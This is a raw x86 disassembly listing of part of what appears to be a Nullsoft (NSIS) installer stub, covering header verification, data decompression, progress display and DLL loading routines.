  402bc0:	8b 74 24 08          	mov    0x8(%esp),%esi
  402bc4:	85 f6                	test   %esi,%esi
  402bc6:	57                   	push   %edi
  402bc7:	8b c6                	mov    %esi,%eax
  402bc9:	7d 02                	jge    0x402bcd
  402bcb:	f7 d8                	neg    %eax
  402bcd:	8b 15 a8 bd 40 00    	mov    0x40bda8,%edx
  402bd3:	8b c8                	mov    %eax,%ecx
  402bd5:	83 e1 0f             	and    $0xf,%ecx
  402bd8:	c1 f8 04             	sar    $0x4,%eax
  402bdb:	ff 34 8a             	push   (%edx,%ecx,4)
  402bde:	c1 e0 0b             	shl    $0xb,%eax
  402be1:	05 a8 95 40 00       	add    $0x4095a8,%eax
  402be6:	50                   	push   %eax
  402be7:	e8 50 34 00 00       	call   0x40603c
  402bec:	85 f6                	test   %esi,%esi
  402bee:	8b f8                	mov    %eax,%edi
  402bf0:	7d 06                	jge    0x402bf8
  402bf2:	57                   	push   %edi
  402bf3:	e8 b6 36 00 00       	call   0x4062ae
  402bf8:	8b c7                	mov    %edi,%eax
  402bfa:	5f                   	pop    %edi
  402bfb:	5e                   	pop    %esi
  402bfc:	c2 04 00             	ret    $0x4
  402bff:	55                   	push   %ebp
  402c00:	8b ec                	mov    %esp,%ebp
  402c02:	81 ec 10 02 00 00    	sub    $0x210,%esp
  402c08:	53                   	push   %ebx
  402c09:	56                   	push   %esi
  402c0a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402c0d:	57                   	push   %edi
  402c0e:	50                   	push   %eax
  402c0f:	a1 b0 92 42 00       	mov    0x4292b0,%eax
  402c14:	0c 08                	or     $0x8,%al
  402c16:	33 db                	xor    %ebx,%ebx
  402c18:	50                   	push   %eax
  402c19:	53                   	push   %ebx
  402c1a:	ff 75 0c             	push   0xc(%ebp)
  402c1d:	ff 75 08             	push   0x8(%ebp)
  402c20:	ff 15 14 70 40 00    	call   *0x407014
  402c26:	3b c3                	cmp    %ebx,%eax
  402c28:	75 69                	jne    0x402c93
  402c2a:	8b 35 30 70 40 00    	mov    0x407030,%esi
  402c30:	bf 05 01 00 00       	mov    $0x105,%edi
  402c35:	eb 19                	jmp    0x402c50
  402c37:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  402c3a:	75 4b                	jne    0x402c87
  402c3c:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402c42:	53                   	push   %ebx
  402c43:	50                   	push   %eax
  402c44:	ff 75 fc             	push   -0x4(%ebp)
  402c47:	e8 b3 ff ff ff       	call   0x402bff
  402c4c:	85 c0                	test   %eax,%eax
  402c4e:	75 12                	jne    0x402c62
  402c50:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402c56:	57                   	push   %edi
  402c57:	50                   	push   %eax
  402c58:	53                   	push   %ebx
  402c59:	ff 75 fc             	push   -0x4(%ebp)
  402c5c:	ff d6                	call   *%esi
  402c5e:	85 c0                	test   %eax,%eax
  402c60:	74 d5                	je     0x402c37
  402c62:	ff 75 fc             	push   -0x4(%ebp)
  402c65:	ff 15 20 70 40 00    	call   *0x407020
  402c6b:	6a 03                	push   $0x3
  402c6d:	e8 82 37 00 00       	call   0x4063f4
  402c72:	3b c3                	cmp    %ebx,%eax
  402c74:	74 24                	je     0x402c9a
  402c76:	53                   	push   %ebx
  402c77:	ff 35 b0 92 42 00    	push   0x4292b0
  402c7d:	ff 75 0c             	push   0xc(%ebp)
  402c80:	ff 75 08             	push   0x8(%ebp)
  402c83:	ff d0                	call   *%eax
  402c85:	eb 0c                	jmp    0x402c93
  402c87:	ff 75 fc             	push   -0x4(%ebp)
  402c8a:	ff 15 20 70 40 00    	call   *0x407020
  402c90:	33 c0                	xor    %eax,%eax
  402c92:	40                   	inc    %eax
  402c93:	5f                   	pop    %edi
  402c94:	5e                   	pop    %esi
  402c95:	5b                   	pop    %ebx
  402c96:	c9                   	leave
  402c97:	c2 0c 00             	ret    $0xc
  402c9a:	39 1d b0 92 42 00    	cmp    %ebx,0x4292b0
  402ca0:	75 ee                	jne    0x402c90
  402ca2:	ff 75 0c             	push   0xc(%ebp)
  402ca5:	ff 75 08             	push   0x8(%ebp)
  402ca8:	ff 15 00 70 40 00    	call   *0x407000
  402cae:	85 c0                	test   %eax,%eax
  402cb0:	75 de                	jne    0x402c90
  402cb2:	eb df                	jmp    0x402c93
  402cb4:	8b 44 24 04          	mov    0x4(%esp),%eax
  402cb8:	85 c0                	test   %eax,%eax
  402cba:	75 0a                	jne    0x402cc6
  402cbc:	a1 84 92 42 00       	mov    0x429284,%eax
  402cc1:	05 01 00 00 80       	add    $0x80000001,%eax
  402cc6:	c2 04 00             	ret    $0x4
  402cc9:	55                   	push   %ebp
  402cca:	8b ec                	mov    %esp,%ebp
  402ccc:	8d 45 08             	lea    0x8(%ebp),%eax
  402ccf:	50                   	push   %eax
  402cd0:	a1 b0 92 42 00       	mov    0x4292b0,%eax
  402cd5:	0b 45 08             	or     0x8(%ebp),%eax
  402cd8:	50                   	push   %eax
  402cd9:	6a 00                	push   $0x0
  402cdb:	6a 22                	push   $0x22
  402cdd:	e8 dd fe ff ff       	call   0x402bbf
  402ce2:	50                   	push   %eax
  402ce3:	a1 a8 bd 40 00       	mov    0x40bda8,%eax
  402ce8:	ff 70 04             	push   0x4(%eax)
  402ceb:	e8 c4 ff ff ff       	call   0x402cb4
  402cf0:	50                   	push   %eax
  402cf1:	ff 15 14 70 40 00    	call   *0x407014
  402cf7:	f7 d8                	neg    %eax
  402cf9:	1b c0                	sbb    %eax,%eax
  402cfb:	f7 d0                	not    %eax
  402cfd:	23 45 08             	and    0x8(%ebp),%eax
  402d00:	5d                   	pop    %ebp
  402d01:	c2 04 00             	ret    $0x4
  402d04:	55                   	push   %ebp
  402d05:	8b ec                	mov    %esp,%ebp
  402d07:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402d0d:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402d14:	75 19                	jne    0x402d2f
  402d16:	6a 00                	push   $0x0
  402d18:	68 fa 00 00 00       	push   $0xfa
  402d1d:	6a 01                	push   $0x1
  402d1f:	ff 75 08             	push   0x8(%ebp)
  402d22:	ff 15 5c 72 40 00    	call   *0x40725c
  402d28:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402d2f:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402d36:	75 4c                	jne    0x402d84
  402d38:	8b 0d 98 be 40 00    	mov    0x40be98,%ecx
  402d3e:	a1 a4 7e 41 00       	mov    0x417ea4,%eax
  402d43:	3b c8                	cmp    %eax,%ecx
  402d45:	7c 02                	jl     0x402d49
  402d47:	8b c8                	mov    %eax,%ecx
  402d49:	50                   	push   %eax
  402d4a:	6a 64                	push   $0x64
  402d4c:	51                   	push   %ecx
  402d4d:	ff 15 54 71 40 00    	call   *0x407154
  402d53:	50                   	push   %eax
  402d54:	8d 45 80             	lea    -0x80(%ebp),%eax
  402d57:	68 1c 90 40 00       	push   $0x40901c
  402d5c:	50                   	push   %eax
  402d5d:	ff 15 e0 71 40 00    	call   *0x4071e0
  402d63:	83 c4 0c             	add    $0xc,%esp
  402d66:	8d 45 80             	lea    -0x80(%ebp),%eax
  402d69:	50                   	push   %eax
  402d6a:	ff 75 08             	push   0x8(%ebp)
  402d6d:	ff 15 60 72 40 00    	call   *0x407260
  402d73:	8d 45 80             	lea    -0x80(%ebp),%eax
  402d76:	50                   	push   %eax
  402d77:	68 06 04 00 00       	push   $0x406
  402d7c:	ff 75 08             	push   0x8(%ebp)
  402d7f:	e8 b9 29 00 00       	call   0x40573d
  402d84:	33 c0                	xor    %eax,%eax
  402d86:	c9                   	leave
  402d87:	c2 10 00             	ret    $0x10
  402d8a:	56                   	push   %esi
  402d8b:	33 f6                	xor    %esi,%esi
  402d8d:	39 74 24 08          	cmp    %esi,0x8(%esp)
  402d91:	74 18                	je     0x402dab
  402d93:	a1 a0 7e 41 00       	mov    0x417ea0,%eax
  402d98:	3b c6                	cmp    %esi,%eax
  402d9a:	74 07                	je     0x402da3
  402d9c:	50                   	push   %eax
  402d9d:	ff 15 54 72 40 00    	call   *0x407254
  402da3:	89 35 a0 7e 41 00    	mov    %esi,0x417ea0
  402da9:	5e                   	pop    %esi
  402daa:	c3                   	ret
  402dab:	39 35 a0 7e 41 00    	cmp    %esi,0x417ea0
  402db1:	74 08                	je     0x402dbb
  402db3:	56                   	push   %esi
  402db4:	e8 77 36 00 00       	call   0x406430
  402db9:	5e                   	pop    %esi
  402dba:	c3                   	ret
  402dbb:	ff 15 80 70 40 00    	call   *0x407080
  402dc1:	3b 05 0c 92 42 00    	cmp    0x42920c,%eax
  402dc7:	76 23                	jbe    0x402dec
  402dc9:	56                   	push   %esi
  402dca:	68 04 2d 40 00       	push   $0x402d04
  402dcf:	56                   	push   %esi
  402dd0:	6a 6f                	push   $0x6f
  402dd2:	ff 35 00 92 42 00    	push   0x429200
  402dd8:	ff 15 90 72 40 00    	call   *0x407290
  402dde:	6a 05                	push   $0x5
  402de0:	50                   	push   %eax
  402de1:	a3 a0 7e 41 00       	mov    %eax,0x417ea0
  402de6:	ff 15 68 72 40 00    	call   *0x407268
  402dec:	5e                   	pop    %esi
  402ded:	c3                   	ret
  402dee:	55                   	push   %ebp
  402def:	8b ec                	mov    %esp,%ebp
  402df1:	83 ec 28             	sub    $0x28,%esp
  402df4:	53                   	push   %ebx
  402df5:	56                   	push   %esi
  402df6:	33 db                	xor    %ebx,%ebx
  402df8:	57                   	push   %edi
  402df9:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402dfc:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402dff:	ff 15 80 70 40 00    	call   *0x407080
  402e05:	be 00 78 43 00       	mov    $0x437800,%esi
  402e0a:	68 00 04 00 00       	push   $0x400
  402e0f:	05 e8 03 00 00       	add    $0x3e8,%eax
  402e14:	56                   	push   %esi
  402e15:	53                   	push   %ebx
  402e16:	a3 0c 92 42 00       	mov    %eax,0x42920c
  402e1b:	ff 15 88 70 40 00    	call   *0x407088
  402e21:	6a 03                	push   $0x3
  402e23:	68 00 00 00 80       	push   $0x80000000
  402e28:	56                   	push   %esi
  402e29:	e8 c1 2d 00 00       	call   0x405bef
  402e2e:	8b f8                	mov    %eax,%edi
  402e30:	83 ff ff             	cmp    $0xffffffff,%edi
  402e33:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402e36:	89 3d 18 90 40 00    	mov    %edi,0x409018
  402e3c:	75 0a                	jne    0x402e48
  402e3e:	b8 e8 91 40 00       	mov    $0x4091e8,%eax
  402e43:	e9 d8 01 00 00       	jmp    0x403020
  402e48:	56                   	push   %esi
  402e49:	be 00 58 43 00       	mov    $0x435800,%esi
  402e4e:	56                   	push   %esi
  402e4f:	e8 c6 31 00 00       	call   0x40601a
  402e54:	56                   	push   %esi
  402e55:	e8 c0 2b 00 00       	call   0x405a1a
  402e5a:	50                   	push   %eax
  402e5b:	68 00 80 43 00       	push   $0x438000
  402e60:	e8 b5 31 00 00       	call   0x40601a
  402e65:	53                   	push   %ebx
  402e66:	57                   	push   %edi
  402e67:	ff 15 84 70 40 00    	call   *0x407084
  402e6d:	3b c3                	cmp    %ebx,%eax
  402e6f:	a3 a4 7e 41 00       	mov    %eax,0x417ea4
  402e74:	8b f0                	mov    %eax,%esi
  402e76:	0f 8e e7 00 00 00    	jle    0x402f63
  402e7c:	bb a8 7e 41 00       	mov    $0x417ea8,%ebx
  402e81:	a1 14 92 42 00       	mov    0x429214,%eax
  402e86:	8b fe                	mov    %esi,%edi
  402e88:	f7 d8                	neg    %eax
  402e8a:	1b c0                	sbb    %eax,%eax
  402e8c:	25 00 7e 00 00       	and    $0x7e00,%eax
  402e91:	05 00 02 00 00       	add    $0x200,%eax
  402e96:	3b f0                	cmp    %eax,%esi
  402e98:	7c 02                	jl     0x402e9c
  402e9a:	8b f8                	mov    %eax,%edi
  402e9c:	57                   	push   %edi
  402e9d:	53                   	push   %ebx
  402e9e:	e8 69 03 00 00       	call   0x40320c
  402ea3:	85 c0                	test   %eax,%eax
  402ea5:	0f 84 22 01 00 00    	je     0x402fcd
  402eab:	83 3d 14 92 42 00 00 	cmpl   $0x0,0x429214
  402eb2:	75 7a                	jne    0x402f2e
  402eb4:	6a 1c                	push   $0x1c
  402eb6:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402eb9:	53                   	push   %ebx
  402eba:	50                   	push   %eax
  402ebb:	e8 ea 2c 00 00       	call   0x405baa
  402ec0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402ec3:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402ec8:	75 72                	jne    0x402f3c
  402eca:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  402ed1:	75 69                	jne    0x402f3c
  402ed3:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  402eda:	75 60                	jne    0x402f3c
  402edc:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  402ee3:	75 57                	jne    0x402f3c
  402ee5:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  402eec:	75 4e                	jne    0x402f3c
  402eee:	09 45 08             	or     %eax,0x8(%ebp)
  402ef1:	8b 45 08             	mov    0x8(%ebp),%eax
  402ef4:	8b 0d 98 be 40 00    	mov    0x40be98,%ecx
  402efa:	83 e0 02             	and    $0x2,%eax
  402efd:	09 05 a0 92 42 00    	or     %eax,0x4292a0
  402f03:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402f06:	3b c6                	cmp    %esi,%eax
  402f08:	89 0d 14 92 42 00    	mov    %ecx,0x429214
  402f0e:	0f 8f b2 00 00 00    	jg     0x402fc6
  402f14:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402f18:	75 06                	jne    0x402f20
  402f1a:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402f1e:	75 41                	jne    0x402f61
  402f20:	ff 45 fc             	incl   -0x4(%ebp)
  402f23:	8d 70 fc             	lea    -0x4(%eax),%esi
  402f26:	3b fe                	cmp    %esi,%edi
  402f28:	76 12                	jbe    0x402f3c
  402f2a:	8b fe                	mov    %esi,%edi
  402f2c:	eb 0e                	jmp    0x402f3c
  402f2e:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402f32:	75 08                	jne    0x402f3c
  402f34:	6a 00                	push   $0x0
  402f36:	e8 4f fe ff ff       	call   0x402d8a
  402f3b:	59                   	pop    %ecx
  402f3c:	3b 35 a4 7e 41 00    	cmp    0x417ea4,%esi
  402f42:	7d 0d                	jge    0x402f51
  402f44:	57                   	push   %edi
  402f45:	53                   	push   %ebx
  402f46:	ff 75 f8             	push   -0x8(%ebp)
  402f49:	e8 57 35 00 00       	call   0x4064a5
  402f4e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402f51:	01 3d 98 be 40 00    	add    %edi,0x40be98
  402f57:	2b f7                	sub    %edi,%esi
  402f59:	85 f6                	test   %esi,%esi
  402f5b:	0f 8f 20 ff ff ff    	jg     0x402e81
  402f61:	33 db                	xor    %ebx,%ebx
  402f63:	6a 01                	push   $0x1
  402f65:	e8 20 fe ff ff       	call   0x402d8a
  402f6a:	39 1d 14 92 42 00    	cmp    %ebx,0x429214
  402f70:	59                   	pop    %ecx
  402f71:	74 53                	je     0x402fc6
  402f73:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  402f76:	74 22                	je     0x402f9a
  402f78:	ff 35 98 be 40 00    	push   0x40be98
  402f7e:	e8 9f 02 00 00       	call   0x403222
  402f83:	8d 45 08             	lea    0x8(%ebp),%eax
  402f86:	6a 04                	push   $0x4
  402f88:	50                   	push   %eax
  402f89:	e8 7e 02 00 00       	call   0x40320c
  402f8e:	85 c0                	test   %eax,%eax
  402f90:	74 34                	je     0x402fc6
  402f92:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f95:	3b 45 08             	cmp    0x8(%ebp),%eax
  402f98:	75 2c                	jne    0x402fc6
  402f9a:	ff 75 ec             	push   -0x14(%ebp)
  402f9d:	6a 40                	push   $0x40
  402f9f:	ff 15 0c 71 40 00    	call   *0x40710c
  402fa5:	8b f0                	mov    %eax,%esi
  402fa7:	a1 14 92 42 00       	mov    0x429214,%eax
  402fac:	83 c0 1c             	add    $0x1c,%eax
  402faf:	50                   	push   %eax
  402fb0:	e8 6d 02 00 00       	call   0x403222
  402fb5:	ff 75 ec             	push   -0x14(%ebp)
  402fb8:	56                   	push   %esi
  402fb9:	53                   	push   %ebx
  402fba:	6a ff                	push   $0xffffffff
  402fbc:	e8 66 00 00 00       	call   0x403027
  402fc1:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  402fc4:	74 11                	je     0x402fd7
  402fc6:	b8 50 90 40 00       	mov    $0x409050,%eax
  402fcb:	eb 53                	jmp    0x403020
  402fcd:	6a 01                	push   $0x1
  402fcf:	e8 b6 fd ff ff       	call   0x402d8a
  402fd4:	59                   	pop    %ecx
  402fd5:	eb ef                	jmp    0x402fc6
  402fd7:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  402fdb:	89 35 10 92 42 00    	mov    %esi,0x429210
  402fe1:	8b 06                	mov    (%esi),%eax
  402fe3:	a3 18 92 42 00       	mov    %eax,0x429218
  402fe8:	74 06                	je     0x402ff0
  402fea:	ff 05 1c 92 42 00    	incl   0x42921c
  402ff0:	6a 08                	push   $0x8
  402ff2:	8d 46 44             	lea    0x44(%esi),%eax
  402ff5:	59                   	pop    %ecx
  402ff6:	83 e8 08             	sub    $0x8,%eax
  402ff9:	01 30                	add    %esi,(%eax)
  402ffb:	49                   	dec    %ecx
  402ffc:	75 f8                	jne    0x402ff6
  402ffe:	6a 01                	push   $0x1
  403000:	53                   	push   %ebx
  403001:	53                   	push   %ebx
  403002:	ff 75 f4             	push   -0xc(%ebp)
  403005:	ff 15 48 71 40 00    	call   *0x407148
  40300b:	89 46 3c             	mov    %eax,0x3c(%esi)
  40300e:	83 c6 04             	add    $0x4,%esi
  403011:	6a 40                	push   $0x40
  403013:	56                   	push   %esi
  403014:	68 20 92 42 00       	push   $0x429220
  403019:	e8 8c 2b 00 00       	call   0x405baa
  40301e:	33 c0                	xor    %eax,%eax
  403020:	5f                   	pop    %edi
  403021:	5e                   	pop    %esi
  403022:	5b                   	pop    %ebx
  403023:	c9                   	leave
  403024:	c2 04 00             	ret    $0x4
  403027:	55                   	push   %ebp
  403028:	8b ec                	mov    %esp,%ebp
  40302a:	81 ec 90 00 00 00    	sub    $0x90,%esp
  403030:	53                   	push   %ebx
  403031:	56                   	push   %esi
  403032:	8b 75 14             	mov    0x14(%ebp),%esi
  403035:	57                   	push   %edi
  403036:	8b 7d 10             	mov    0x10(%ebp),%edi
  403039:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40303c:	85 ff                	test   %edi,%edi
  40303e:	75 07                	jne    0x403047
  403040:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  403047:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40304b:	8b df                	mov    %edi,%ebx
  40304d:	85 ff                	test   %edi,%edi
  40304f:	75 05                	jne    0x403056
  403051:	bb a0 fe 40 00       	mov    $0x40fea0,%ebx
  403056:	8b 45 08             	mov    0x8(%ebp),%eax
  403059:	85 c0                	test   %eax,%eax
  40305b:	7c 0e                	jl     0x40306b
  40305d:	8b 0d 58 92 42 00    	mov    0x429258,%ecx
  403063:	03 c8                	add    %eax,%ecx
  403065:	51                   	push   %ecx
  403066:	e8 b7 01 00 00       	call   0x403222
  40306b:	8d 45 14             	lea    0x14(%ebp),%eax
  40306e:	6a 04                	push   $0x4
  403070:	50                   	push   %eax
  403071:	e8 96 01 00 00       	call   0x40320c
  403076:	85 c0                	test   %eax,%eax
  403078:	0f 84 45 01 00 00    	je     0x4031c3
  40307e:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  403082:	0f 84 24 01 00 00    	je     0x4031ac
  403088:	ff 15 80 70 40 00    	call   *0x407080
  40308e:	b9 10 be 40 00       	mov    $0x40be10,%ecx
  403093:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403096:	e8 78 34 00 00       	call   0x406513
  40309b:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  4030a2:	8b 45 14             	mov    0x14(%ebp),%eax
  4030a5:	89 45 08             	mov    %eax,0x8(%ebp)
  4030a8:	0f 8e 54 01 00 00    	jle    0x403202
  4030ae:	be 00 40 00 00       	mov    $0x4000,%esi
  4030b3:	39 75 14             	cmp    %esi,0x14(%ebp)
  4030b6:	7d 03                	jge    0x4030bb
  4030b8:	8b 75 14             	mov    0x14(%ebp),%esi
  4030bb:	bf a0 be 40 00       	mov    $0x40bea0,%edi
  4030c0:	56                   	push   %esi
  4030c1:	57                   	push   %edi
  4030c2:	e8 45 01 00 00       	call   0x40320c
  4030c7:	85 c0                	test   %eax,%eax
  4030c9:	0f 84 f4 00 00 00    	je     0x4031c3
  4030cf:	29 75 14             	sub    %esi,0x14(%ebp)
  4030d2:	89 3d 28 be 40 00    	mov    %edi,0x40be28
  4030d8:	89 35 2c be 40 00    	mov    %esi,0x40be2c
  4030de:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4030e1:	b9 10 be 40 00       	mov    $0x40be10,%ecx
  4030e6:	89 1d 30 be 40 00    	mov    %ebx,0x40be30
  4030ec:	a3 34 be 40 00       	mov    %eax,0x40be34
  4030f1:	e8 3d 34 00 00       	call   0x406533
  4030f6:	85 c0                	test   %eax,%eax
  4030f8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4030fb:	0f 8c a3 00 00 00    	jl     0x4031a4
  403101:	8b 35 30 be 40 00    	mov    0x40be30,%esi
  403107:	2b f3                	sub    %ebx,%esi
  403109:	ff 15 80 70 40 00    	call   *0x407080
  40310f:	f6 05 b4 92 42 00 01 	testb  $0x1,0x4292b4
  403116:	8b f8                	mov    %eax,%edi
  403118:	74 49                	je     0x403163
  40311a:	2b 45 f4             	sub    -0xc(%ebp),%eax
  40311d:	3d c8 00 00 00       	cmp    $0xc8,%eax
  403122:	77 06                	ja     0x40312a
  403124:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403128:	75 39                	jne    0x403163
  40312a:	8b 45 08             	mov    0x8(%ebp),%eax
  40312d:	ff 75 08             	push   0x8(%ebp)
  403130:	2b 45 14             	sub    0x14(%ebp),%eax
  403133:	6a 64                	push   $0x64
  403135:	50                   	push   %eax
  403136:	ff 15 54 71 40 00    	call   *0x407154
  40313c:	50                   	push   %eax
  40313d:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403143:	68 1c 92 40 00       	push   $0x40921c
  403148:	50                   	push   %eax
  403149:	ff 15 e0 71 40 00    	call   *0x4071e0
  40314f:	83 c4 0c             	add    $0xc,%esp
  403152:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  403158:	50                   	push   %eax
  403159:	6a 00                	push   $0x0
  40315b:	e8 19 20 00 00       	call   0x405179
  403160:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403163:	85 f6                	test   %esi,%esi
  403165:	74 31                	je     0x403198
  403167:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40316b:	75 13                	jne    0x403180
  40316d:	56                   	push   %esi
  40316e:	53                   	push   %ebx
  40316f:	ff 75 0c             	push   0xc(%ebp)
  403172:	e8 2a 2b 00 00       	call   0x405ca1
  403177:	85 c0                	test   %eax,%eax
  403179:	74 2d                	je     0x4031a8
  40317b:	01 75 fc             	add    %esi,-0x4(%ebp)
  40317e:	eb 0c                	jmp    0x40318c
  403180:	01 75 fc             	add    %esi,-0x4(%ebp)
  403183:	29 75 f8             	sub    %esi,-0x8(%ebp)
  403186:	8b 1d 30 be 40 00    	mov    0x40be30,%ebx
  40318c:	83 7d f0 01          	cmpl   $0x1,-0x10(%ebp)
  403190:	0f 85 48 ff ff ff    	jne    0x4030de
  403196:	eb 6a                	jmp    0x403202
  403198:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  40319c:	0f 8f 0c ff ff ff    	jg     0x4030ae
  4031a2:	eb 5e                	jmp    0x403202
  4031a4:	6a fc                	push   $0xfffffffc
  4031a6:	eb 1d                	jmp    0x4031c5
  4031a8:	6a fe                	push   $0xfffffffe
  4031aa:	eb 19                	jmp    0x4031c5
  4031ac:	85 ff                	test   %edi,%edi
  4031ae:	74 47                	je     0x4031f7
  4031b0:	39 75 14             	cmp    %esi,0x14(%ebp)
  4031b3:	7d 03                	jge    0x4031b8
  4031b5:	8b 75 14             	mov    0x14(%ebp),%esi
  4031b8:	56                   	push   %esi
  4031b9:	57                   	push   %edi
  4031ba:	e8 4d 00 00 00       	call   0x40320c
  4031bf:	85 c0                	test   %eax,%eax
  4031c1:	75 3c                	jne    0x4031ff
  4031c3:	6a fd                	push   $0xfffffffd
  4031c5:	58                   	pop    %eax
  4031c6:	eb 3d                	jmp    0x403205
  4031c8:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4031cb:	39 75 14             	cmp    %esi,0x14(%ebp)
  4031ce:	7d 03                	jge    0x4031d3
  4031d0:	8b 75 14             	mov    0x14(%ebp),%esi
  4031d3:	bf a0 be 40 00       	mov    $0x40bea0,%edi
  4031d8:	56                   	push   %esi
  4031d9:	57                   	push   %edi
  4031da:	e8 2d 00 00 00       	call   0x40320c
  4031df:	85 c0                	test   %eax,%eax
  4031e1:	74 e0                	je     0x4031c3
  4031e3:	56                   	push   %esi
  4031e4:	57                   	push   %edi
  4031e5:	ff 75 0c             	push   0xc(%ebp)
  4031e8:	e8 b4 2a 00 00       	call   0x405ca1
  4031ed:	85 c0                	test   %eax,%eax
  4031ef:	74 b7                	je     0x4031a8
  4031f1:	01 75 fc             	add    %esi,-0x4(%ebp)
  4031f4:	29 75 14             	sub    %esi,0x14(%ebp)
  4031f7:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4031fb:	7f cb                	jg     0x4031c8
  4031fd:	eb 03                	jmp    0x403202
  4031ff:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403202:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403205:	5f                   	pop    %edi
  403206:	5e                   	pop    %esi
  403207:	5b                   	pop    %ebx
  403208:	c9                   	leave
  403209:	c2 10 00             	ret    $0x10
  40320c:	ff 74 24 08          	push   0x8(%esp)
  403210:	ff 74 24 08          	push   0x8(%esp)
  403214:	ff 35 18 90 40 00    	push   0x409018
  40321a:	e8 53 2a 00 00       	call   0x405c72
  40321f:	c2 08 00             	ret    $0x8
  403222:	6a 00                	push   $0x0
  403224:	6a 00                	push   $0x0
  403226:	ff 74 24 0c          	push   0xc(%esp)
  40322a:	ff 35 18 90 40 00    	push   0x409018
  403230:	ff 15 48 71 40 00    	call   *0x407148
  403236:	c2 04 00             	ret    $0x4
  403239:	56                   	push   %esi
  40323a:	be 00 68 43 00       	mov    $0x436800,%esi
  40323f:	56                   	push   %esi
  403240:	e8 69 30 00 00       	call   0x4062ae
  403245:	56                   	push   %esi
  403246:	e8 fa 27 00 00       	call   0x405a45
  40324b:	85 c0                	test   %eax,%eax
  40324d:	75 02                	jne    0x403251
  40324f:	5e                   	pop    %esi
  403250:	c3                   	ret
  403251:	56                   	push   %esi
  403252:	e8 77 27 00 00       	call   0x4059ce
  403257:	56                   	push   %esi
  403258:	e8 68 24 00 00       	call   0x4056c5
  40325d:	56                   	push   %esi
  40325e:	68 00 60 43 00       	push   $0x436000
  403263:	e8 b6 29 00 00       	call   0x405c1e
  403268:	5e                   	pop    %esi
  403269:	c3                   	ret
  40326a:	81 ec d4 02 00 00    	sub    $0x2d4,%esp
  403270:	53                   	push   %ebx
  403271:	56                   	push   %esi
  403272:	57                   	push   %edi
  403273:	6a 20                	push   $0x20
  403275:	5f                   	pop    %edi
  403276:	33 db                	xor    %ebx,%ebx
  403278:	68 01 80 00 00       	push   $0x8001
  40327d:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  403281:	c7 44 24 10 e0 92 40 	movl   $0x4092e0,0x10(%esp)
  403288:	00 
  403289:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40328d:	ff 15 b0 70 40 00    	call   *0x4070b0
  403293:	ff 15 ac 70 40 00    	call   *0x4070ac
  403299:	66 3d 06 00          	cmp    $0x6,%ax
  40329d:	74 11                	je     0x4032b0
  40329f:	53                   	push   %ebx
  4032a0:	e8 4f 31 00 00       	call   0x4063f4
  4032a5:	3b c3                	cmp    %ebx,%eax
  4032a7:	74 07                	je     0x4032b0
  4032a9:	68 00 0c 00 00       	push   $0xc00
  4032ae:	ff d0                	call   *%eax
  4032b0:	be b8 72 40 00       	mov    $0x4072b8,%esi
  4032b5:	56                   	push   %esi
  4032b6:	e8 c9 30 00 00       	call   0x406384
  4032bb:	56                   	push   %esi
  4032bc:	ff 15 5c 71 40 00    	call   *0x40715c
  4032c2:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4032c6:	80 3e 00             	cmpb   $0x0,(%esi)
  4032c9:	75 ea                	jne    0x4032b5
  4032cb:	55                   	push   %ebp
  4032cc:	6a 09                	push   $0x9
  4032ce:	e8 21 31 00 00       	call   0x4063f4
  4032d3:	6a 07                	push   $0x7
  4032d5:	e8 1a 31 00 00       	call   0x4063f4
  4032da:	a3 04 92 42 00       	mov    %eax,0x429204
  4032df:	ff 15 3c 70 40 00    	call   *0x40703c
  4032e5:	53                   	push   %ebx
  4032e6:	ff 15 a4 72 40 00    	call   *0x4072a4
  4032ec:	a3 b8 92 42 00       	mov    %eax,0x4292b8
